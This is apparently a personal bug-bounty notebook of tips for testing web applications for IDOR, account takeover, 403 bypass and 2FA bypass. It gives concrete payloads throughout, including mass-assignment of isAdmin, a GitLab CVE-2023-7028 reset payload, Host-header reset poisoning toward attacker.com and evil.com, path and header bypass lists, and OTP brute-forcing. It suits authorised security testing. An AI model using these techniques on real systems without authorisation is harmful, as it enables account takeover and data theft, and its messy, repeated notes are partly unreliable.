[ ] Never ignore encoded/hashed ID
for hashed ID ,create multiple accounts and understand the
ppattern application users to allot an iD
[ ] Google Dorking/public form
search all the endpoints having ID which the search engine may have already indexed
[ ] Bruteforce Hidden HTTP parameters
use tools like arjun , paramminer

    
    tip    UPDATING ACCOUNT FIXTURES
    Sometimes when updating your account settings, they'll send your userid as a parameter. Manipulating this can sometimes result in another users profile being edited. Don't forget that if one feature is vulnerable to IDOR then it may be a site-wide issue (and don't forget to check mobile site!). Even if you do not see your ID in the post data, just simply try adding it. id=, uid=, userid=, especially if it is a GraphQL query or JSON post data (if it's PUT).

 tip
 reset password
 check if you can   be able to control input that affects another user via their identifier, inside of userid, check if you change it to another identifier example phone no, email
 NOTE NOTE 
 Awlays Look for values which identifies you when interacting with the site/API, then to check if you can provide another users ID

 SQL ERROR
 POST /updateUser
 Host: example.com

 user_id=1338&name=test
 
 If you were to provide user_id=1338-1 and it was vulnerable, then the code would execute against user_id=1337. The code

$sql = "UPDATE users SET name='test' WHERE id='1338-1'"; will be executed as being user id 1337



   tip in any website building website   under different accounts
   create two account, domianone and domain two
    change the landing page’s website name to the second account’s domain. 
    Navigating to the match and replace section on  burpsuite, I  replaced every instance of domainone.com with domaintwo.com
     ventured into the second account’s domain — domaintwo.com. Uploading new pages, tweaking configurations 
     
   
   
 
 
   
   check for Alot of nos  in whatever reposnse  you have.  while intercepint in burpsuite, allows try to change every value, eg-> error to success, 1234 to 3456, check if id is encoded or not in a plain text, then decode it, 
   check if file can be accessed directly from the url, without needing port authecation   //images are commoly venearble to this
   check by changing the request method, or expolit involves using a different method. 
   ids not actually numbers but strings?, somtimes the id can be expolited via username or email change of an i
   can you bypass payment
   can you do actions on others behalf
   can you destroy or damage any asset or info
   NOTE:: Almost 80% of idors are found in rest API, GET OR POST REQUEST BODY
   
   
       
       tip
   Create new password and confirm it then clicked in Reset Password button.
intercept the request and started to analyzing each request.
After sometime I found that after create a new password, The application authenticated me, But redirect me to /logout page to force me login again and ask for 2fa code.
So what I did is next
Intercepted all requests from target.com, then I found the request that responsible for redirect me to /logout page, I dropped it using Burp Suite
Returning to the browser, I found that it had redirected me to my profile page without asking for 2fa code.
   
   
   
   Description of areas in ecommerce websites that are prone to IDOR attacks:
In ecommerce websites, there are several areas that are particularly prone to IDOR attacks. These areas include:

URLs that include a reference to a user’s private data, such as order numbers or account IDs.
Pages that allow users to view or modify their own data, such as order status or account details.
Pages that generate dynamic content, such as PDF downloads.
  
  
  
I've stumbled upon 10+ similar issues on shopping sites that allow guest checkouts 🛒. 

Many overlook these issues because they require placing an order 📦. However, some services support cash on delivery 💸 or allow you to place a cheap order and then cancel it for a refund 🔄, making it worth adding to your checklist if other prerequisites are met.

Here's what to look for:

1️⃣ Target app that permits guest orders without creating an account 🕵️‍♂️
2️⃣ Target app doesn't require email verification for new account creation, or you've found an email verification bypass on sign-up 📧🔓

If these prerequisites are met, you can often find target apps with a misconfiguration that lets you access a guest user's order history by creating a new account with the same email used for the guest order. 

Here's how it usually goes down:

1️⃣ Place an order on the site as a "Guest" and use the victim's email during checkout, e.g., victim@example.com 📩 
2️⃣ The victim receives an email with the receipt 📧
3️⃣ As an attacker, sign up using the email victim@example.com assuming there's no email verification 🧑‍💻
4️⃣ Navigate to the account's order history page, and you might strike gold 🪙 by finding the previously made orders, leading to Order History and PII leaks 🔍📜

Takeaways: Don't ignore workflows involving payments; you might discover workarounds like cheap payments or cash on delivery 💡💳. Test for unusual flows and be ready for pleasant surprises with some lucrative bounties         
  
     TIP 0
     THIS IS FOR TESTING WEB APP FOR IDOR
     set up burp in browerser1
     do  a password reset in browers1
     open the password reset email in browers2 (without using burp) and copy the token
     search for your burp history (browser1) for the token. if there is, you have got yourself a nice easy account takeover
   
   
  TIPS 1
  
  🚀 When it comes to efficient bug hunting, active crawling can be a game-changer. One of the tools I rely on is Katana, which helps retrieve URLs and parameters for thorough testing against XSS, SQLI, SSTI, and more.

👉 Here's a one-liner that kicks off the process: 

katana -list targets.txt -silent -d 6 -rl 25 -jc -f qurl

🔑 What's the next step? Take the URLs you've obtained from active crawling and include them in your XSS, SQLI, and SSTI checks. This strategy broadens your attack surface, making it easier to spot vulnerabilities and secure those quick wins.

💡Takeaways: Leveraging Katana's capabilities can help you uncover hidden issues efficiently and bolster your bug bounty earnings. Happy hunting!

  TIPs 2
  1. collect a list of all JS files from your target
2. download em' all
3. beautify em 
4. write a script that searches for high-entropy strings inside JS files
5. if found, check if sensitive
6. if sensitive, report

   TIPS 3
   Bug Bounty Tips: 🐛 Working on a wide-scope target and need to quickly pinpoint Interesting assets for your security assessment? Here's a nifty one-liner to help you do just that:

1️⃣ Create a list of your target/subdomains in 'targets.txt'.
2️⃣ Use the 'httpx' tool with the '-mr' flag to search for specific keywords. For example, you can look for the term 'register' in the responses using the command like:

cat targets.txt  | httpx -mr "register" 

🔍 What happens next? You'll get a list of assets where the keyword 'register' appears in the HTTP responses. These assets often lead to registration or sign-up pages. Exploring these can reveal security vulnerabilities waiting to be discovered.

⚙️ Want to take it a step further? Build your custom keyword lists, including terms like 'login,' 'signup,' 'admin', and more. Tailor your searches to uncover assets of interest quickly.

🚀 I've used this simple yet effective technique countless times on expansive scopes to gain an edge in bug hunting. Stay proactive and stay secure!
   
   
    TIPS 4
    Here are the brief steps:
(1) Went to http://example.com, used Login with Facebook (Unchecked share email on Facebook) 
(2) The target site asked to enter an email to link my FB account as no email was shared from FB. Entered victim@example.com, a confirmation link was sent to the victim's email to bind the account. 
(3) Repeated the same steps on the target site using the same FB account, this time choose to link attacker@example.com on target site – received the same link as step (2) on the attacker controlled email! 
(4) Knowing this, repeated the same steps again to link victim@example.com, and used earlier link which was received on attacker@example.com to takeover victim@example.com account. 

Lesson: Always test unusual login flows by logging in with a 3rd party provider without sharing email with the target site. These designs can be flawed and lead to nice bounties!

    
      
    IDOR
   TIP 5
  
  Here's how to successfully elevated role to an Internal admin, exposing admin functionalities, resulting in a mass PII leak and access to other sensitive Internal reports:

1️⃣ Navigated to target[.]com and accessed the sign-up page to create an account. 

2️⃣ The sign-up page accepted three parameters: name, email address, and password. 

3️⃣ As a practice, I closely monitored responses from critical functions to spot anything intriguing. Upon successful registration, here's the server's response: 

{"success": true, "user_id": 123, "name": "xxx", "email": "xxx@example.com", "isAdmin": false} 

4️⃣ What would you do if you saw a response like that? You guessed it right! 

5️⃣ Returned to the sign-up form, registered for a new account, and intercepted the following request during sign-up: 

{"name": "xxx", "email": "xxx@example.com", "password": "pass"} 

6️⃣ Injected an additional parameter, "isAdmin": true, to test if the application would process it. Modified my request body to :

{"name": "xxx", "email": "xxx@example.com", "password": "pass", "isAdmin": true} 

7️⃣ BAM! The server processed my account as an admin, making me an Internal admin and revealing significant administrative functionality.

Takeaways: Always scrutinize critical app requests/responses for anomalies. Don't hesitate to spend an extra minute testing the basics—you might be pleasantly surprised by the results! 💡🐛💰
    
    TIP
     
I've stumbled upon 10+ similar issues on shopping sites that allow guest checkouts 🛒. 

Many overlook these issues because they require placing an order 📦. However, some services support cash on delivery 💸 or allow you to place a cheap order and then cancel it for a refund 🔄, making it worth adding to your checklist if other prerequisites are met.

Here's what to look for:

1️⃣ Target app that permits guest orders without creating an account 🕵️‍♂️
2️⃣ Target app doesn't require email verification for new account creation, or you've found an email verification bypass on sign-up 📧🔓

If these prerequisites are met, you can often find target apps with a misconfiguration that lets you access a guest user's order history by creating a new account with the same email used for the guest order. 

Here's how it usually goes down:

1️⃣ Place an order on the site as a "Guest" and use the victim's email during checkout, e.g., victim@example.com 📩 
2️⃣ The victim receives an email with the receipt 📧
3️⃣ As an attacker, sign up using the email victim@example.com assuming there's no email verification 🧑‍💻
4️⃣ Navigate to the account's order history page, and you might strike gold 🪙 by finding the previously made orders, leading to Order History and PII leaks 🔍📜

Takeaways: Don't ignore workflows involving payments; you might discover workarounds like cheap payments or cash on delivery 💡💳. Test for unusual flows and be ready for pleasant surprises with some lucrative bounties 
   
      
    tip6
      
Here's a simple approach to spot these vulnerabilities: misconfigured object  IN  Salesforce site?

1️⃣ Install this amazing tool - 🔧 https://github.com/moniik/poc_salesforce_lightning
2️⃣ Run python3 http://exploit.py -u https://{{target(.)com -d -s
3️⃣ The tool will automatically scan for object misconfigurations and display objects with result counts. 
4️⃣ Found any interesting objects with a result count >0? 🧐 
5️⃣ You can explore further in this nice article - 📖 https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-2-fuzz-exploit-eefae11ba5ae to exploit the misconfiguration.

   tip 7
      EC2 subdomian takeover 
🚀 Opportunity Alert! 🛠️ Automating EC2 Subdomain Takeovers can be a goldmine, and less than 10 people are on it! The likelihood of duplicates is low, and bounties range from $500 to $3000. 

Here's a brief methodology:
(1) Identify potential dangling EC2 targets (Using nuclei template)
(2) Spin up multiple free-tier EC2 Instances in same regions where dangling targets were found e.g. us-east-1, etc.
(3) Run the start-stop script to change IP addresses and retain matching EC2 Instance
(4) Host your PoC on the hijacked EC2 Instance
(5) Enjoy a nice 'High' severity bounty
(6) Rinse and Repeat! 🔄 #BugBounty #EC2Takeovers, #cybersecurity,#HackerOne,#Bugcrowd

Check out this article for details: https://web.archive.org/web/20220331095516/blog.melbadry9.xyz/dangling-dns/aws/ddns-ec2-current-state
Here's the link to the nuclei template - https://github.com/projectdiscovery/nuclei-templates/raw/2ff27f5a024d7a8179b241931d00adc4d5d3fa93/dns/ec2-detection.yaml
Here's the link to the start-stop script - https://github.com/adilnbabras/EC2-Start-Stop

      Tip 8
      
     THIS IS FOR TESTING WEB APP FOR IDOR
     set up burp in browerser1
     do  a password reset in browers1
     open the password reset email in browers2 (without using burp) and copy the token
     search for your burp history (browser1) for the token. if there is, you have got yourself a nice easy account takeover
     
     
     
     Tip 9
     GET /admin HTTP/1.1
   Host: http://site.com
...
   Access is denied

   GET /test HTTP/1.1
   Host: http://site.com
  X-Original-URL: /admin
 
   HTTP/1.1 200 OK 
   
    tip 10
    
    application allows for free and paid features
    only able to access free features
    clicking paid features, redirect to payment link for paid
    forund a params as "disabled"
    access granted to paid feature
   
   
   tip 11
   Testing authorization/access controls with a numeric ID? Try decimals/floats and round to the number you want to access.

  Example:
  admin role ID is 1
  Try to set your ID to 0.9 and it may bypass the auth check as system will round up after auth check  and allwos check userid, credit card details,username,passwords in urls
  
  Tip 12
  Changing host header on password reset page to see if it's used to form part of the resulting link emailed to the user (thus leaking the one-time password reset token).  and allows check for http parameter pollution in the password reset page on the email parameter. and Signing up a account with spaces, like "admin  " and check if the app will give u access to admin account
  //remember//
  Response received when enabling a user functionality using password can work out with other account by entering a wrong password ( get the response of the 1st account in repeater now copy the same on the other account by do intercept - respond to this request option in burp)
  
  ////
  Changing host header on password reset page to see if it's used to form part of the resulting link emailed to the user (thus leaking the one-time password reset token).
  
  
  tip 13
  Go to [your-domain.teleport.sh/web/accesslists].
Create a new access list.
Add a user as List Owner.
Add a role to "Roles Granted," e.g., "reviewer" role.
From Access List Owner Account:
Add a new member to the access list and intercept the request.
Add "editor" role on "grants roles."
The "editor" role will be added to "Permissions Granted."
Logout and relogin.
Now, the user has the "editor" role and can perform any action on the organization.
  
  tip 14
  
  Bug Bounty Tips!!! IDOR

Steps to Reproduce

1.Go to https://example{.}com/
2.Go to vendor login.
3.Make one attacker account and one victim account.
4.Login as attacker.
5.Go to My Account.
6.Update your profile and intercept your request with burp suite, make  sure your foxy proxy is on, you will notice this request, take a look  at userId parameter and save it your notepad:
7.Change email to new email: example I changed to this email: exa@gmail.com or to exa2@gmail.com
8.But make sure you created victim account.  So, change it to the victim email.
9.Before you change your email, make sure to turn your foxy proxy on and open your burp suite.
10. Now change to victim email.
In http history (in Burp Suite) you will notice this request
11. In request you can see userId parameter is same from attacker  request and from victims request. It doesn't change userId when you  update your email.
12. In request, change the ID to your test account's ID.
13. Before changing ID to test account's ID. All you need to do is to  create a new account (test account). For test account I was using this  email: tes@gmail.com
14.If you created test account make sure to turn your foxy proxy on,  update your profile and intercept request in your burp suite again.
16.And now you can change the  victims ID to your test account's ID.
17.But when you change your ID to victim's ID example:
18. Now change to Email parameter to this mail: attacker@gmail.com
19.Update userId parameter from  123464 (attackers ID) to 123464 (tests ID or victims ID).
20.Make sure you changed email.
21. Now send request.
22. Now try to login as a exa@gmail.com with attackers password.
23. You will see it works.





   7)
   when changing password functionality, always change the user name to administrator, admin to check if you could get in admin dashboard 
   
   and always check out from the store, intercept the request, add more items to your bucket and then send the  intercepted request with burp repeater and watch the response
    
    
 



               My Bug hunting Methodology 📝

                 Registration Testing 
                 
        ) Check for duplicate registration/Overwrite existing users
        2) Check for weak password policy. 
        3) Check for reuse existing usernames. 

         4) Check for insufficient e-mail verification process. 
         5) Weak registration implementation - Allows disposable email address. 
  
  
    TIP
    
     Question of the day: What automated checks can you perform after subdomain reconnaissance?🌐

Many people gather subdomains but struggle with what to do next with this dataset. 

Here are some automated checks you can conduct on these subdomains:

🌀 Subdomain Takeovers: Verify subdomain takeovers using tools like Nuclei and dnsReaper.
📂 Passive Source URLs: Gather as many URLs as possible from passive sources such as Wayback Machine and AlienVault. Consider using Waymore, an excellent tool for this purpose.
📝 Active Source URLs: Collect active URLs and parameters using Katana.
🔍 Custom Nuclei Templates: Develop your custom Nuclei templates to check for SQL injection (SQLI), cross-site scripting (XSS), server-side template injection (SSTI), etc. For example, look for SQLI in User-Agent and Referer headers, and XSS in parameters and URIs. Apply these templates to all collected URLs.
🔐 Check for Leaked Secrets: Utilize Nuclei templates to search for leaked credentials or secrets on these URLs.
🧩 JS Files and Monitoring: Extract all JS files from passive and active sources and identify APIs using tools like LinkFinder, JSLuice, and GAP. Automate crawling these APIs and create custom regex patterns to detect sensitive data or large responses. Apply a similar approach to identify hard-coded credentials.
🚀 Directory Fuzzing: Employ wordlists from Assetnote for directory fuzzing on these subdomains to uncover hidden files and directories. Filter out HTTP status codes like 200 and 301, then investigate further.
🔎 Automated Parameter Mining: Develop custom scripts to automatically discover hidden parameters on collected URLs. Once identified, run these through your custom Nuclei templates again.
🌟 Identify Interesting Assets: Use title, keywords in response bodies, knowledge of vulnerable products, and more to identify intriguing assets for manual review.

There are many additional ideas you can build upon to enhance your automation capabilities. Stay tuned for more insights! 





           ACCOUNT TAKEOVER        ACCOUNT TAKEOVER             ACCOUNT TAKEOVER
      
   1) Check if weak password can be set
       if yes, then check for brute-forcing
    if no rate-limit 0r 429, too many requests response doesnst come within few minutes of bruteforcing, you can raise the report by mention
    WEAK PASSWORD POLICY WITH NO RATE-LIMIT
    
   2) TRY TO SEND TOKEN IN RESET PASSSWORD
     check on reset password
     enter your mail id
     intercept the request
     add Token Parameter
     {
     email: "smaty@gmail.com",
     token: "ggsgsgsfaagagagcz vzzvzzczcczczczcthisismytoken"                               any giberish
     }
     
     check if the crafted token is sent or not , if yes report for account takeover
     
    
   
    3)RESET PASSWORD POISONING
    go to reset password function,
    enter your email
    intercet the request
       change the Host header to some other Header such AS at Attacker.com,
       Example:
       Host: Taget.com  -> Host: attacker.com
    Along with this, you can try to add new Headers   NOTE: dont change the header ( Host: Taget.com)
        X-forword-Host: attacker.com,
        Referrer:  https://attacker.com
        
    4) RESPONSE MANIPULATION
      try with correct username and password
        check the response status and body
      
      try wrong username and passwrod
      change the reponse code and body with the response of the correct username and password
      forward the request
      
     5
     “always change in response from false to true you can find a magic”
     1- run burp and login in website

     go to proxy options and go match and replace

      {{“areAdsDisabled”:false}} We change the value of this parameter to true in response body

    Now we do a refresh of the site and browse it and it will not show any ads
      
    6) TRY CSRF ON MAJOR ENDPOINT
     try Csrf on passowrd change
     try csrf on email change
     try csrf on phone no change 
     try csrf on securlity change 
     
     
   7  Token Leaks In Response
    So there are multiple ways to do it but all are same.
    So I will sharing my method that I have learnt here .
     Endpoints:(Register,Forget Password)
    Steps(For Registration):
         1. For registeration intercept the signup request that contains the data you have entered.
         2. Click on action -> do -> intercept the response to this request.
        3. Click forward.
       4. Check response if that contains any link, any token or OTP.
        
        Steps (For password reset):
        1. Intercept the forget password option.
       2. Click on action -> do -> intercept the response to this request.
         3      . Click forward.
        4. Check response if that contains any link,any token or OTP.
        
     tip   
       where the form dosnt validate special character
       Zero click full Account takeover tip👇
1. Register with username identical to victim's with added spaces
2. Request password reset 
3. Now use token to rest victim’s password

 tip
GitLab CE/EE Account Takeover via Password Reset without user interactions CVE-2023-7028
Poc: in the rest password endpoint 
user[email][]=valid@email.com&user[email][]=attacker@email.com 
       
       
       Using Auth Bypass
Check out Auth Bypass method, there is a method for OTP bypass via response manipulation, this can leads to account takeovers.
1.Enter the wrong auth code / Password
2.Capture a auth request in burpsuite and send it to repeater 
3.Check for the resoponse
4.Change the respone by manipulating the following parameters
  {“code”:”invalid_credentials”} -> {“code”:”valid_credentials”}
  {“verify”:”false”}             -> {“verify”:”true”}
       
       Password Reset Poisioning Leads To Token Theft    Password Reset Poisioning Leads To Token Theft
       1.Go to password reset funtion.
2.Enter email and intercept the request.
3.Change host header to some other host i.e,
    Host:target.com
    Host:attacker.com
  also try to add some headers without changing host like
    X-Forwarded-Host: evil.com
    Referrer: https://evil.com
4.Forward this if you find that in next request attacker.com means you managed to successfully steal the token. :)

   tip
   create an account (victim@test.com)
go to the account register page in another browser (i’m using firefox container ) and create an another account using the same email with \u0023 at the end (victim@test.com\u0023) with different password( i’m using burpsuite to edit the email
   
   

   tip    ACCOUNTTAKEOVER BY  HOST HEADER INJECTION:
  change the host header or  deliberately introduce or  full stop (period) character (“.” or a widcard or any symbols) at the end of the HOST header within the reset password request/ or any request  and proceed to transmit it. The altered header appears as follows: Host: target.com.  or Host: target.com*
   check if any email is being sent , if yes, confirm that the website is vulnarable.
   manuipulate the data in burp and check your responses
     change the crafted the reset password request by adding the full URL to the top
     add the Burp Collaborator link to the Host Header and sent the request
     
     
     
     
     TIPS FOR ACCOUNT TAKEOVER  
     )Checked if OTP is leaked somewhere in the response or is sent along with the request. 

  Left the OTP value blank and forwarded the request as sometimes the application validates the OTP only if its value is present. 

  Completely removed the ‘OTP’ parameter from the request and forwarded it. 
  

 Passed an array of emails[“attacker.@xyz.com”,“victim.@xyz.com”]  or using ; account1@mail.com;account2@mail.com  to check how the application behaves.Does It send the same OTP to both
accounts? 
  nested array
  {"emails":[["random@gmail.com"]],"captchaValue":"_"}
  Send the email as a JSON object
  {"emails":[{"email": "random@gmail.com"}],"captchaValue":"_"}
 


Entered the correct OTP but changed my email address to the victim’s address. 

Tried to brute-force the code but there was some kind of rate limiting present. 

Sometimes passing an array of numbers/OTP with the valid one might result in something interesting. 

To check the randomness of the OTP I decided to send many requests at a time in the forget password endpoint. 
   adding %00, space at the end, space at the beginning of the email 
   
  *****     ****    **** ACCOUNT TAKEOVER BY SERVER KNOWING YOU ARE MAKING PASSWORD RESET 
   sender the attacker password reset,
   sender  the victim password  reset  , 
  so now the site knows that VICTIM-EMAIL@gmail.com will reset his password ok now we’ll continue the regular process to reset the password, and when the site sends the password & password_confirmation & email we’ll replace our email with the victim's email. And voila I reseted his password successfully
  ******
   collect  employee's emails from Github and LinkedIn
   made a request to reset the password, then intercepted it and sent it to the intruder to see which account on my list exists as admin on the site
   
   
   ******     ******    *****
   enter some random characters into “Old Password” Field. Enter new password into remaining fields and capture the request into Burpsuite.
   manipulated response from “Incorrect Old Password” to “Success”.  and forwarding the response, observed the Cookie Parameter in Request captured 
   
   
   check if you could change any mail to another mail or burp colloborator or intersact
   
   
    *****    *****   *****
    (“/ProgramManagerREDACTED/REDACTED/updateuser”), alwys removed the body request and the two last directories and changed the “PUT” request into “GET”. The response from the server was “200 OK”, and the response body was massive information about hidden endpoints:
    I decided to take the first request (“Edit Account”) with the same original request body, but changing the endpoint to the one I just found (“/ProgramManagerREDACTED/userInfoDetailsEntities/{user_info_id}”), so I sent a “PUT” request, with changing the “role_id” parameter value to “4” and the “mail” parameter value to hash mail.
   
   ****      ****
   You need to create two accounts on let’s say vulnerable.com website, suppose those accounts are victim@gmail.com and attacker@gmail.com assuming them victim and attacker respectively! Secondly , go to attacker account and change mail to 123@gmail.com then a verification link will be sent to 123@gmail.com. Copy that link and paste it on web session of victim@gmail.com account , if it is vulnerable then the email of victim will be updated to 123@gmail.com
   
   
   tip
   request for password change
   1. Change the email to the victim email.

   2. Remove [The Header (X_auth_credentials) and the Parameter (‘currentPassword ‘)].

   3. Put any new password you want

   4. Send the request and you got 200 OK as a response.

     . Login to the victim account with the new password and here we go you successfully accessed his account.
     
     
      tip
      1. Forgot password => Enter email => Receive email with link:
      Click on this link to reset your password.The link expires in...          the link  /passreset/<token>
      click on it 
      Filling in the 2 fields, sending and intercepting :
      check for id parameter in the request of burpsurp
      mauipulate the response  and check for user roles 
   
   
   
   403 BYPASS    403 BYPASS     403 BYPASS
   
   /// finding hidden parameter /// ///
   https://medium.com/mii-cybersec/hunting-for-hidden-parameters-in-burp-suite-98b54616f863
  check for  403 forbidden pages and pages that automatically redirect to another page (300 *** response) and send it to params miner
  they are four option Guess GET parameters, Guess cookie parameters, Guess headers, and Guess everything. try (Guess GET parameters)or others and press ok
  go to the  “Extensions” tab on your Burp Suite. Then go to “Installed -> Param Miner -> Output”, parameter should be output
    check for the paremeters that was found and send it to burp repeter
    use testbounty to test the request
    GET ./index.php?note=testbounty Http/2    and check the response                           //note was intended as the param that was found
    try several injection attacks, such as 
    , SQLI, SSRF, etc
    
    
   https://github.com/iamj0ker/bypass-403
   
   https://github.com/reinhardt-pwn/Bypass-http         check more on github
     guide
     To use this tool, you’ll need to enter the IP of the target (if you only have the DNS address, go to a DNS lookup online), and the path to the Access Denied error.
     python3 bypass_http.py -i 94.237.62.195 -a /auth/login -p 36517  -v HTTP/1.0
   
   
   
   ## Change request method:

Change requested methods like GET → POST, GET — > TRACE etc.

## Try to bypass 403 with the curl command

If adding Content-Length:0 is successfully bypassing 403 then you can exploit it with this command

curl -X POST -H “Content-Length:0” https://www.xyz.com

   OR

If you see adding X-rewrite-url is able to bypass 403 then your exploit command will be

curl -i -s -k -X $’GET’ -H $’Host: sub.xyz.com’ -H $’X-rewrite-url: .htaccess’ $’https://sub.xyz.com/'

## common one:

like

xyz.com/secret/*

xyz.com/secret/./

xyz.com/secret/

xyz.com/%2f/secret.txt/

   tools
   https://github.com/gotr00t0day/forbiddenpass
   
   account takeover using HOMOGRAPH  and HOMOGLIPH  ..... if in any user webapp, that fixture admin, try to register  new accout using HOMOGRAPH  and HOMOGLIPH  example first account  = Tommy  and second accont =  Tömmy and guess what  you could  became the Admin for the company “Tommy”
   
  PATH FUZZING AND CREATIVE STRING LITERALS.
   htts://host.com/path = 403 forbidden
   https://host.com/%2e/path = 200 ok
   Example paths to fuzz below
 /../
/...
/..%00
/..%01
/..%0a
/..%0d
/..%09
/~root
/~admin
/%20/
/%2e%2e/
/%252e%252e/
/%c0%af/
/%e0%80%af
   /admin/, you could try /admin/’,/admin%2e/, or/admin/.htaccess`
   
    USER-AGENT FUZZING    *****   i will look more about this 
    Sometimes developers want to serve different content depending on what kind of browser/OS you use to access the web app.
    
    HTTP HEADERS FUZZING 
    this technique involves sending a request to the target server with a modified HTTP header. X-Forwarded-For, Referer and Authorization headers are the most popular one to be modified. X-Forwarded-For can be fuzzed to bypass security controls that rely on IP address filtering. By changing the IP address in this header, an attacker can attempt to bypass any security controls that are based on IP address filtering
    
    Headers:
- X-Forwarded-For
- X-Forward-For
- X-Forwarded-Host
- X-Forwarded-Proto
- Forwarded
- Via
- X-Real-IP
- X-Remote-IP
- X-Remote-Addr
- X-Trusted-IP
- X-Requested-By
- X-Requested-For
- X-Forwarded-Server
    
Values:
- 10.0.0.0
- 10.0.0.1
- 127.0.0.1
- 127.0.0.1:443
- 127.0.0.1:80
- localhost
- 172.16.0.0


   *** change header  by using  x-original-url
             Get /admin http 1:1
             Host: target.com
             try this
             Get /anything http 1:1
             host: target.com
             x-original-Url: /admin 
    
    
    add .  //  and ; in the end of the url
    https://target.secret/.
     https://target//secret//
      https://target/.secret/.
       https://target;secret
        https://target.;secret
         https://target//;//secret
    
    
    DOWNGRADE THE PROTOCOL VERSION.
    You can also try all other techniques along with downgrading the protocol, one useful one might be to downgrade to 1.0 and remove the Host header at all - it can cause unexpected behaviour of the server
    0.9    1.0   1.1   2
    
    Case switching technique
It involves altering the case of characters in the URL path to try and bypass access controls. example.com/user gives you 401? Try example.com/User, example.com/%75ser or example.com/USer etc.
    
    HTTP REQUEST SMUGGLING    ******   (****    check http request
    
    Exploiting Hop-by-Hop request header
    
    To understand this technique one should first get familiar with hop-to-hop headers. Hop-by-hop headers are HTTP headers that are intended for communication between a client and a server, and that are not forwarded by intermediaries such as proxies or caches. These headers are called "hop-by-hop" because they are processed on a per-hop basis, meaning that each intermediary along the path of the request will see and potentially modify the headers as they pass through. The HTTP/1.1 specification defines the following headers as hop-by-hop headers:
    Connection, Keep-Alive, Proxy-Authenticate, Proxy-Authorization, TE, Trailer, Transfer-Encoding
    
    
    
    SPRING FRAMEWORK SPECIFIC BYPASS TECHNIQUE     **** check more on this   ****
    



   
  
   
   2FA BYPASS      2FA BYPASS         2FA BYPASS              2FA BYPASS
   
  note :  bypassed by adding two X-Forwarded-For: IP headers.
Copy
POST /reset HTTP/2
Host:example.com
X-Forwarded-For:1.1.1.1
X-Forwarded-For:2.2.2.2
   
   
   Zero Interaction Mass Account Password Reset Vulnerability
   Navigate to https://xxxx.xxx.com/xx?id=xx_forgot_password.
Enter the victim’s email address.
Intercept the request using a proxy tool like Burp Suite.
Modify the “pass_sent” parameter from false to true in the POST request body:
{
  "emailEmpty": true,
  "pass_sent": false,
  "customer_email": "{victim's email}",
  "action": "changePassword",
  "sessionRotationTrigger": true
}
Forward the request to the server.


tip tip
 when testing testing the password reset functionality always, check if the ‘first name’ or ‘last name’ fields of the user were reflected in the email in order to attempt an HTML email injection attack.
 
 tip
 [1] An attacker sends a request to the API endpoint “/api/v1/people/forgot_password” requesting the reset password of the victim’s account.

[2] The Attacker paste the reset password token and the victim’s ID (extracted from the response) in the password reset link :

https://www.redacted.com/reset_password?code="REPLACE_WITH_RESET_PASSWORD_CODE"&id=REPLACE_WITH_ID_PARAMETER

[3] The attacker can now open the link in his browser, and reset the victim’s password.

[4] The Attacker gain access to the account (Account Take Over), without any action from the victim.
   
   
   tip   tip   tip    https://infosecwriteups.com/story-of-lock-up-users-account-by-dos-attack-cost-1-100-87b47d06a7c1
   When a user has an active session on the website and he’s working on the website online, when the update password request is sent to the user’s email, the user’s session is locked until they enter the temp password and update their password without them knowing this is happening by the attacker.

But this wasn’t as easy as it looks, there was a CAPTCHA in our way to making the request which could be bypassed by removing the CAPTCHA parameter.

Now the attacker could lock someone’s account just by having their email which was public in their profile.
   
   
   There are several ways to bypass the OTP, 

I attempted to brute force the OTP code, but there was a rate limit, so I failed.
I experimented with magic OTPs, and as you can guess, I failed.
I tested a Race condition on OTPs, and again, I failed.


    . Go to https://www.xyz.com.
2. Go for the password reset option.
3. Enter the victim’s mail id.
4. Enter a random 4-digit OTP.
5. Capture the request in burp and send it to an intruder.
6. Create the payload of 4 digit number and start the attack.
7. You can see the changes in the length and status code 200 OK.
8. Enter the correct OTP and change the password of the victim’s account.


  tip 
  go  to the password reset page and entered your email
  run  Burp Suite and make Intercept on.
  Create new password and confirm it then clicked in Reset Password button.
  intercepted the request and started to analyzing each request
  Intercepted all requests from target.com, check  the request that is responsible for redirect to /logout page, and  drop it using Burp Suite
  Returning to the browser, and check if it  have redirect you  to the profile page without asking for 2fa code.

   
   
   
     Bypassing two-factor authentication
[ ] Flawed two-factor verification logic Sometimes flawed logic in two-factor authentication means that
after a user has completed the initial login step, the website doesn't adequately verify that the same user
is completing the second step For example, the user logs in with their normal credentials in the first step
as follows:
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&password=qwerty
They are then assigned a cookie that relates to their account, before being taken to the second step of
the login process:
HTTP/1.1 200 OK
Set-Cookie: account=carlos
GET /login-steps/second HTTP/1.1
Cookie: account=carlos
When submitting the verification code, the request uses this cookie to determine which account the user
is trying to access:
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456`
In this case, an attacker could log in using their own credentials but then change the value of the
account cookie to any arbitrary username when submitting the verification code.
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456
[ ] Clickjacking on 2FA Disable Feature
1. Try to Iframe the page where the application allows a user to disable 2FA
2. If Iframe is successful, try to perform a social engineering attack to manipulate victim to login
[ ] Response Manipulation
1. Check Response of the 2FA Request.
2. If you Observe "Success":false
3. Change this to "Success":true and see if it bypass the 2FA

[ ] Status Code Manipulation
1. If the Response Status Code is 4XX like 401, 402, etc.
2. Change the Response Status Code to "200 OK" and see if it bypass the 2FA
[ ] 2FA Code Reusability
1. Request a 2FA code and use it
2. Now, Re-use the 2FA code and if it is used successfully that's an issue.
3. Also, try requesting multiple 2FA codes and see if previously requested Codes expire or not wh
4. Also, try to re-use the previously used code after long time duration say 1 day or more. That

[ ] CSRF on 2FA Disable Feature
1. Request a 2FA code and use it
2. Now, Re-use the 2FA code and if it is used successfully that's an issue.
3. Also, try requesting multiple 2FA codes and see if previously requested Codes
expire or not when a new code is requested
4. Also, try to re-use the previously used code after long time duration say 1 day or
more. That will be an potential issue as 1 day is enough duration to crack and guess
a 6-digit 2FA code


[ ] Backup Code Abuse
Apply same techniques used on 2FA such as Response/Status Code Manipulation,
Brute-force, etc. to bypass Backup Codes and disable/reset 2FA
[ ] Enabling 2FA Doesn't Expire Previous Session
1. Login to the application in two different browsers and enable 2FA from 1st session.
2. Use 2nd session and if it is not expired, it could be an issue if there is an insufficient
session expiration issue. In this scenario if an attacker hijacks an active session before
